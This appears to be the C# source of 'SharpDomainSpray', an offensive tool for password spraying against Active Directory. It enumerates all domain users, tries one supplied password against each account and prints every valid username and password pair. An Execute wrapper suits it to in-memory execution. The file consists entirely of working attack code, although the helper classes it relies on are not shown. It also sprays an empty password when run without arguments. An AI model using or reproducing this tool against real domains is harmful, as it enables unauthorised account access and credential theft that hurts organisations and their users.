using System;
using System.Collections.Generic;
using System.Linq;
using System.DirectoryServices.AccountManagement;
using System.Text;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Runtime.InteropServices;

namespace SharpDomainSpray
{
    class Program
    {
[DllImport("shell32.dll", SetLastError = true)]
static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

[DllImport("advapi32.dll", SetLastError = true)]
static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

public static string[] CommandLineToArgs(string commandLine)
{
    int argc;
    var argv = CommandLineToArgvW(commandLine, out argc);
    if (argv == IntPtr.Zero)
        throw new System.ComponentModel.Win32Exception();
    try
    {
        var args = new string[argc];
        for (var i = 0; i < args.Length; i++)
        {
            var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
            args[i] = Marshal.PtrToStringUni(p);
        }

        return args;
    }
    finally
    {
        Marshal.FreeHGlobal(argv);
    }
}

public static string Execute(string commandLine)
{
    var sw = new StringWriter();
    Console.SetOut(sw);
    Console.SetError(sw);

    try
    {
        Main(CommandLineToArgs(commandLine));
    }
    catch (Exception e)
    {
        return e.ToString();
    }

    return sw.ToString();
}

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                System.Console.WriteLine("SharpSpray: Perform password spraying for all active users on a domain.");
                System.Console.WriteLine("");
                System.Console.WriteLine("Usage: SharpSpray.exe PASSWORD");
            }

            string pass_to_guess = String.Empty;

            if (args.Length == 1)
            {
                pass_to_guess = args[0];
            }

            List<string> ad_users = new List<string>();
            string domain_name = DomainInformation.GetDomainOrWorkgroup();

            ADUser aduser = new ADUser();
            ad_users = aduser.ADuser();

            ADAuth auth = new ADAuth();
            bool valid_or_not = false;
            foreach (string line in ad_users)
                {
                    valid_or_not = auth.Authenticate(line, pass_to_guess, domain_name);
                        if (valid_or_not == true)
                        {
                        Console.WriteLine("");
                        Console.WriteLine("User: " + line + " " + "Password is: " + pass_to_guess);
                        }
                    
                }
             
        }
 
    }
}

